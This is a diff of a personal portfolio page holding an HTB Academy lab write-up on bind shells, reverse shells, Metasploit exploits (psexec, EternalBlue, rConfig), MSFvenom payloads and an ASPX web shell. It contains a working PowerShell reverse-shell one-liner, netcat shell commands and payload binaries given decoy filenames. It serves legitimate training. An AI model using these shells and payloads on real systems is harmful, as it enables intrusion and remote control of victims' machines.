@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reverse Shells – ACADEMY-SHELLS-WIN10 - DragonRingki Cybersecurity</title>
-    <meta name="description" content="HTB Academy reverse shell lab on ACADEMY-SHELLS-WIN10 - a focused writeup on Windows reverse shells by Matthew (DragonRingki).">
+    <title>CAT5 / Inlanefreight – Shells & Payloads - DragonRingki Cybersecurity</title>
+    <meta name="description" content="HTB Academy lab walk-through on Shells & Payloads by Matthew (DragonRingki).">
     <link rel="stylesheet" href="../styles.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -64,6 +64,7 @@
             padding: 20px;
             margin: 15px 0;
             position: relative;
+            overflow-x: auto;
         }
         
         .command-block::before {
@@ -80,6 +81,7 @@
             background: none;
             color: var(--accent-green);
             white-space: pre-wrap;
+            word-wrap: break-word;
         }
         
         .highlight-box {
@@ -142,148 +144,333 @@
         <a href="../portfolio.html" class="back-link">Back to Portfolio</a>
         
         <div class="writeup-header">
-            <h1>Reverse Shells – HTB Academy ACADEMY-SHELLS-WIN10</h1>
+            <h1>CAT5 / Inlanefreight – Shells & Payloads</h1>
             <div class="writeup-meta">
-                <span class="meta-badge">Difficulty: Intro / Learning</span>
-                <span class="meta-badge">Category: Tactics / Shells</span>
-                <span class="meta-badge">Platform: HTB Academy (Windows 10)</span>
+                <span class="meta-badge">Difficulty: Intermediate</span>
+                <span class="meta-badge">Category: Tactics / Shells & Payloads</span>
+                <span class="meta-badge">Platform: HTB Academy</span>
                 <span class="meta-badge">Date: March 2026</span>
             </div>
-            <p>Short focused lab on understanding reverse shells from a Windows 10 host in HTB Academy, using netcat listeners and PowerShell payloads to get command execution back to my attack box.</p>
+            <p>Action log and walk-through covering bind shells, reverse shells, payload generation, and web shells on Windows and Linux targets.</p>
         </div>
 
         <div class="writeup-content">
-            <!-- Overview Section -->
+            
+            <!-- Section 1 -->
             <div class="section">
-                <h3>📋 Overview</h3>
-                <p>
-                    This lab is part of the HTB Academy “Shells &amp; Payloads” module. 
-                    The goal here is simple: prove I understand what a reverse shell is, set up a 
-                    listener on my attack box, fire a PowerShell reverse shell from ACADEMY-SHELLS-WIN10,
-                    and use the session to retrieve the hostname (<code>shells-Win10</code>).
-                </p>
-            </div>
-
-            <!-- Reconnaissance Section -->
-            <div class="section">
-                <h3>🔍 Reconnaissance</h3>
-                <p>
-                    Since this is an Academy lab, the “recon” is mostly environment awareness:
-                    confirm connectivity, log into the Windows target, and identify my own VPN IP
-                    for the reverse shell callback.
-                </p>
-                
-                <div class="command-block">
-                    <code>ip a | grep tun0</code>
-                </div>
-                
-                <div class="highlight-box">
-                    <strong>Key Finding:</strong> My tun0 interface IP is used as <code>LHOST</code> / <code>ATTACKER_IP</code> 
-                    in all reverse shell payloads. The Windows target must call back to this address, not 127.0.0.1 or its own IP.
-                </div>
-            </div>
-
-            <!-- Enumeration Section -->
-            <div class="section">
-                <h3>🔎 Enumeration</h3>
-                <p>
-                    The Academy instructions give direct RDP access to the Windows 10 lab host:
-                </p>
+                <h3>1 / 17 – Engagement Context</h3>
                 <ul>
-                    <li>Target IP: <code>10.129.11.9</code></li>
-                    <li>Hostname (later confirmed via reverse shell): <code>shells-Win10</code></li>
-                    <li>Service: RDP (supplied by the lab)</li>
-                    <li>Credentials: <code>htb-student / HTB_@cademy_stdnt!</code></li>
+                    <li>I assumed the role of a Junior Pentester at CAT5 Security.</li>
+                    <li>My target environment is Inlanefreight (legal HTB lab).</li>
+                    <li>My objectives:</li>
+                    <ul>
+                        <li>Execute bind and reverse shells.</li>
+                        <li>Deploy Metasploit and MSFvenom payloads.</li>
+                        <li>Compromise Linux, Windows, and web applications.</li>
+                    </ul>
                 </ul>
-                
+            </div>
+
+            <!-- Section 2 -->
+            <div class="section">
+                <h3>2 / 17 – Shells vs Payloads Setup</h3>
+                <ul>
+                    <li>I use shells to interact with the OS after gaining access.</li>
+                    <ul>
+                        <li>Linux targets: <code>bash</code>, <code>sh</code>.</li>
+                        <li>Windows targets: <code>cmd.exe</code>, <code>powershell.exe</code>.</li>
+                    </ul>
+                    <li>I use payloads as the delivery mechanism to establish the shell.</li>
+                    <ul>
+                        <li>I generate payloads via Metasploit or MSFvenom.</li>
+                    </ul>
+                </ul>
+            </div>
+
+            <!-- Section 3 -->
+            <div class="section">
+                <h3>3 / 17 – Environment Preparation</h3>
+                <ul>
+                    <li>I checked my local Pwnbox configuration.</li>
+                    <li>I verified my cross-platform PowerShell version.</li>
+                </ul>
                 <div class="command-block">
-                    <code># From my local machine / Pwnbox (using the RDP client provided by HTB or xfreerdp)<br>
-xfreerdp /u:htb-student /p:"HTB_@cademy_stdnt!" /v:10.129.11.9</code>
+                    <code>$PSVersionTable</code>
+                </div>
+                <ul>
+                    <li>I noted that initial shells will be non-interactive.</li>
+                    <li>I will need to upgrade them to interactive TTY shells to use <code>sudo</code> or <code>vim</code>.</li>
+                </ul>
+            </div>
+
+            <!-- Section 4 -->
+            <div class="section">
+                <h3>4 / 17 – Executing Bind Shells</h3>
+                <ul>
+                    <li>I configured the victim to open a port and wait for my connection.</li>
+                    <li>I connected from my attack box to the open port.</li>
+                </ul>
+                <p><strong>Linux Target (with <code>-e</code>):</strong></p>
+                <div class="command-block">
+                    <code># Executed on Victim
+nc -lvnp 4444 -e /bin/bash
+
+# Executed on Attack Box
+nc &lt;victim-ip&gt; 4444</code>
+                </div>
+                <p><strong>Linux Target (without <code>-e</code> support):</strong></p>
+                <div class="command-block">
+                    <code># Executed on Victim (mkfifo trick)
+mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -lvnp 4444 &gt; /tmp/f
+
+# Executed on Attack Box
+nc &lt;victim-ip&gt; 4444</code>
+                </div>
+                <div class="warning-box">
+                    <strong>Note:</strong> Bind shells often fail against real firewalls. I prefer reverse shells for actual engagements.
                 </div>
             </div>
 
-            <!-- Exploitation Section -->
+            <!-- Section 5 -->
             <div class="section">
-                <h3>⚡ Exploitation</h3>
-                <p>
-                    The “exploit” here is just abusing the fact I have an interactive session on Windows.
-                    I start a netcat listener on my attack box, then run a PowerShell reverse shell one-liner 
-                    from the RDP session back to that listener.
-                </p>
-                
-                <div class="warning-box">
-                    <strong>⚠️ Important:</strong> In a <strong>reverse shell</strong>, the <em>victim</em> (Windows box) 
-                    acts as the <strong>client</strong> and initiates the connection out to my <strong>listener</strong> 
-                    (attacker = server). This is the opposite of a bind shell.
-                </div>
-                
-                <p><strong>1) Start listener on attack box</strong></p>
+                <h3>5 / 17 – Executing Reverse Shells (Windows Lab)</h3>
+                <ul>
+                    <li>Target: 10.129.11.9 (ACADEMY-SHELLS-WIN10).</li>
+                    <li>I set up my attack box to listen for incoming connections.</li>
+                    <li>I executed a payload on the victim to dial back to my IP.</li>
+                </ul>
+                <p><strong>Step 1: Start Listener</strong></p>
                 <div class="command-block">
-                    <code># On my HTB attack box (Kali / Pwnbox)<br>
-nc -lvnp 4444</code>
+                    <code>nc -lvnp 4444</code>
                 </div>
-
-                <p><strong>2) Trigger PowerShell reverse shell from ACADEMY-SHELLS-WIN10</strong></p>
-                <p>In the RDP session, open PowerShell or CMD and run the following, replacing <code>ATTACKER_IP</code> with my tun0 IP:</p>
+                <p><strong>Step 2: Execute PowerShell Payload on Target</strong></p>
                 <div class="command-block">
                     <code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"</code>
                 </div>
-
-                <div class="highlight-box">
-                    <strong>Key Behaviour:</strong> Once the command runs, the Windows box opens a TCP connection to 
-                    <code>ATTACKER_IP:4444</code>, and wires that connection to a PowerShell process. Anything I type 
-                    into netcat is executed on the Windows host.
-                </div>
-            </div>
-
-            <!-- Post-Exploitation Section -->
-            <div class="section">
-                <h3>🎯 Post-Exploitation</h3>
-                <p>
-                    After the connection hits my listener, I have a basic interactive PowerShell session.
-                    The lab question asks for the hostname of the target machine, which I can now grab over the reverse shell.
-                </p>
-                
-                <div class="command-block">
-                    <code># In the netcat session on my attack box<br>
-hostname</code>
-                </div>
-
+                <ul>
+                    <li><strong>Challenge:</strong> Entering the complex PowerShell one-liner accurately without triggering syntax or character escaping errors in the Windows command line.</li>
+                </ul>
                 <div class="success-box">
-                    <strong>✅ Success:</strong> The command returned <code>shells-Win10</code>, confirming both that the 
-                    reverse shell worked and that the target host’s name matches the lab question.
+                    <strong>Verification:</strong> I caught the shell on my listener. I ran <code>hostname</code>. Output was <code>[REDACTED]</code>.
                 </div>
             </div>
 
-            <!-- Key Learnings Section -->
+            <!-- Section 6 -->
             <div class="section">
-                <h3>📚 Key Learnings</h3>
+                <h3>6 / 17 – Payload Generation Workflow</h3>
                 <ul>
-                    <li>In a reverse shell, the <strong>target is the client</strong>, the <strong>attacker is the server/listener</strong>.</li>
-                    <li>Always use your <strong>VPN/tun0 IP</strong> for <code>LHOST</code> in HTB labs, not localhost or the target’s IP.</li>
-                    <li>A simple <strong>netcat listener + PowerShell one-liner</strong> is enough to get a usable reverse shell on Windows.</li>
-                    <li>Once you have any shell, basic commands like <code>hostname</code> can verify context and answer lab questions quickly.</li>
+                    <li>I used Metasploit for direct exploitation.</li>
+                    <li>I used MSFvenom to generate standalone files.</li>
+                </ul>
+                <p><strong>Metasploit Flow:</strong></p>
+                <div class="command-block">
+                    <code>msfconsole
+use &lt;exploit/module&gt;
+set RHOSTS &lt;target-ip&gt;
+set RPORT &lt;port&gt;
+set PAYLOAD &lt;payload/name&gt;
+set LHOST &lt;tun0-ip&gt;
+set LPORT &lt;my-port&gt;
+run</code>
+                </div>
+                <div class="highlight-box">
+                    <strong>Payload Selection:</strong><br>
+                    - I use <strong>Staged</strong> payloads when exploit buffer space is restricted.<br>
+                    - I use <strong>Stageless</strong> payloads for stability over bad networks.
+                </div>
+            </div>
+
+            <!-- Section 7 -->
+            <div class="section">
+                <h3>7 / 17 – Psexec Exploitation Walk-through</h3>
+                <ul>
+                    <li>Target: 10.129.201.160.</li>
+                    <li>I obtained valid SMB credentials: <code>htb-student</code> / <code>HTB_@cademy_stdnt!</code></li>
+                    <li>I loaded the <code>psexec</code> module in Metasploit.</li>
+                </ul>
+                <div class="command-block">
+                    <code>use exploit/windows/smb/psexec
+set RHOSTS 10.129.201.160
+set SMBUser htb-student
+set SMBPass HTB_@cademy_stdnt!
+set LHOST 10.10.15.191
+set LPORT 4444
+exploit</code>
+                </div>
+                <ul>
+                    <li>I successfully caught a SYSTEM Meterpreter shell.</li>
+                    <li>I navigated to <code>C:\Users\htb-student\Documents</code>.</li>
+                    <li><strong>Challenge:</strong> Navigating a Windows file system using Meterpreter-specific commands rather than standard native CMD tools.</li>
+                </ul>
+                <div class="success-box">
+                    <strong>Flag Retrieval:</strong> I executed <code>search -f [REDACTED].txt</code> in Meterpreter. I read the file to capture the flag.
+                </div>
+            </div>
+
+            <!-- Section 8 -->
+            <div class="section">
+                <h3>8 / 17 – Creating Standalone Binaries (MSFvenom)</h3>
+                <ul>
+                    <li>I needed payloads for targets without direct exploit vectors.</li>
+                    <li>I listed available modules using <code>msfvenom -l payloads</code>.</li>
+                    <li>I generated stageless payloads to avoid secondary download stages.</li>
+                </ul>
+                <p><strong>Generated Linux ELF:</strong></p>
+                <div class="command-block">
+                    <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; createbackup.elf</code>
+                </div>
+                <p><strong>Generated Windows EXE:</strong></p>
+                <div class="command-block">
+                    <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe</code>
+                </div>
+                <ul>
+                    <li>I set up local netcat listeners and waited for the victim to execute the files.</li>
                 </ul>
             </div>
 
-            <!-- Tools Used Section -->
+            <!-- Section 9 -->
             <div class="section">
-                <h3>🛠️ Tools Used</h3>
+                <h3>9 / 17 – EternalBlue Walk-through (MS17-010)</h3>
                 <ul>
-                    <li><strong>Netcat (nc):</strong> Used as a TCP listener on my attack box to catch the reverse shell connection.</li>
-                    <li><strong>PowerShell:</strong> Built-in on Windows 10, used to create the reverse TCP connection back to my listener.</li>
-                    <li><strong>RDP client / xfreerdp:</strong> To interact with the Windows 10 lab host (ACADEMY-SHELLS-WIN10).</li>
+                    <li>Target OS identified as Windows via Nmap TTL (128).</li>
+                    <li>I verified SMB vulnerability using Metasploit scanner <code>smb_ms17_010</code>.</li>
+                    <li>I launched the exploit.</li>
+                </ul>
+                <div class="command-block">
+                    <code>use exploit/windows/smb/ms17_010_psexec
+set RHOSTS &lt;TARGET_IP&gt;
+set LHOST &lt;MY_TUN0_IP&gt;
+set LPORT 4444
+exploit</code>
+                </div>
+                <ul>
+                    <li>I gained a SYSTEM Meterpreter session.</li>
+                    <li>I dropped into a native Windows command prompt using the <code>shell</code> command.</li>
+                    <li><strong>Challenge:</strong> Remembering to switch context from Linux syntax (<code>cat</code>) to Windows syntax (<code>type</code>) when reading files in CMD.</li>
+                </ul>
+                <div class="success-box">
+                    <strong>Flags Retrieved:</strong><br>
+                    - Vulnerability: <code>[REDACTED]</code>.<br>
+                    - Exploit Extension: <code>[REDACTED]</code>.<br>
+                    - I found and read the flag using <code>type flag.txt</code>. Value: <code>[REDACTED]</code>.
+                </div>
+            </div>
+
+            <!-- Section 10 -->
+            <div class="section">
+                <h3>10 / 17 – Exploiting Web Apps (rConfig RCE)</h3>
+                <ul>
+                    <li>Target: 10.129.201.101.</li>
+                    <li>I scanned the host. Nmap revealed CentOS, Apache, and rConfig 3.9.6.</li>
+                    <li>I selected an authenticated file upload RCE module in Metasploit.</li>
+                </ul>
+                <div class="command-block">
+                    <code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+set RHOSTS 10.129.201.101
+set LHOST 10.10.15.191
+set LPORT 4444
+exploit</code>
+                </div>
+                <ul>
+                    <li>I observed the default payload was <strong>[REDACTED]</strong> (<code>[REDACTED]/meterpreter/reverse_tcp</code>).</li>
+                    <li>I caught the shell and upgraded it to a TTY.</li>
+                    <li>I investigated the file system for flags.</li>
+                    <li><strong>Challenge:</strong> The initial shell was highly unstable and non-interactive. Upgrading to a full TTY using Python was required immediately to prevent session drops.</li>
+                </ul>
+                <div class="success-box">
+                    <strong>Answers:</strong><br>
+                    - Payload language: [REDACTED].<br>
+                    - I navigated to <code>/devicedetails</code>. I read the YAML file. Router Hostname: <strong>[REDACTED]</strong>.
+                </div>
+            </div>
+
+            <!-- Section 11 -->
+            <div class="section">
+                <h3>11 / 17 – Upgrading to Interactive Shells</h3>
+                <ul>
+                    <li>My initial exploit shells were restricted (no prompt, broken formatting).</li>
+                    <li>I used Python to spawn a fully interactive PTY.</li>
+                </ul>
+                <div class="command-block">
+                    <code>python -c 'import pty; pty.spawn("/bin/sh")'
+# If python3 is the only version available:
+python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+                </div>
+                <ul>
+                    <li>This restored my ability to use command history, <code>su</code>, and reliable text editors.</li>
+                    <li>If Python was missing, I fell back to the script method.</li>
+                </ul>
+                <div class="command-block">
+                    <code>script /dev/null -c bash</code>
+                </div>
+            </div>
+
+            <!-- Section 12 -->
+            <div class="section">
+                <h3>12 / 17 – Deploying Web Shells</h3>
+                <ul>
+                    <li>I use web shells when standard reverse shells fail due to strict egress filtering.</li>
+                    <li>I exploit a vulnerability (like file upload) to drop a server-side script.</li>
+                    <li>I access the script via HTTP to execute OS commands.</li>
+                    <li>I match the shell to the environment: PHP for Linux/Apache, ASPX for Windows/IIS.</li>
+                    <li>These shells run as low-privilege service accounts (e.g., <code>www-data</code>).</li>
                 </ul>
             </div>
 
-            <!-- References Section -->
+            <!-- Section 13 -->
             <div class="section">
-                <h3>📖 References</h3>
+                <h3>13 / 17 – Laudanum ASPX Shell Walk-through</h3>
                 <ul>
-                    <li><a href="https://academy.hackthebox.com/" target="_blank">HTB Academy – Shells &amp; Payloads Module</a></li>
-                    <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation#reverse-shells" target="_blank">PayloadsAllTheThings – Windows Reverse Shells</a></li>
+                    <li>Target: 10.129.42.197 (Windows Server 2019, IIS 10.0).</li>
+                    <li>I identified an upload form at <code>status.inlanefreight.local</code>.</li>
+                    <li>I copied the Laudanum ASPX shell from my Kali build.</li>
+                </ul>
+                <div class="command-block">
+                    <code>cp /usr/share/laudanum/aspx/shell.aspx /home/htb-student/demo.aspx</code>
+                </div>
+                <ul>
+                    <li>I edited the file to whitelist my attack IP.</li>
+                    <li>I uploaded the shell via the web app.</li>
+                    <li>I executed the shell by navigating to <code>http://status.inlanefreight.local/files/demo.aspx</code>.</li>
+                    <li><strong>Challenge:</strong> Understanding that the IIS worker process directory (where commands execute) differs from the web root directory (where the payload is stored).</li>
+                </ul>
+                <div class="success-box">
+                    <strong>Landing Directory Verification:</strong> I executed <code>echo %CD%</code> in the web shell interface. The IIS process returned <code>[REDACTED]</code>.
+                </div>
+            </div>
+
+            <!-- Section 14 (Placeholder) -->
+            <div class="section">
+                <h3>14 / 17 – [Reserved for Future Content]</h3>
+                <ul>
+                    <li><em>Add your notes for Section 14 here.</em></li>
                 </ul>
             </div>
+
+            <!-- Section 15 (Placeholder) -->
+            <div class="section">
+                <h3>15 / 17 – [Reserved for Future Content]</h3>
+                <ul>
+                    <li><em>Add your notes for Section 15 here.</em></li>
+                </ul>
+            </div>
+
+            <!-- Section 16 (Placeholder) -->
+            <div class="section">
+                <h3>16 / 17 – [Reserved for Future Content]</h3>
+                <ul>
+                    <li><em>Add your notes for Section 16 here.</em></li>
+                </ul>
+            </div>
+
+            <!-- Section 17 (Placeholder) -->
+            <div class="section">
+                <h3>17 / 17 – [Reserved for Future Content]</h3>
+                <ul>
+                    <li><em>Add your notes for Section 17 here.</em></li>
+                </ul>
+            </div>
+
         </div>
     </div>
 
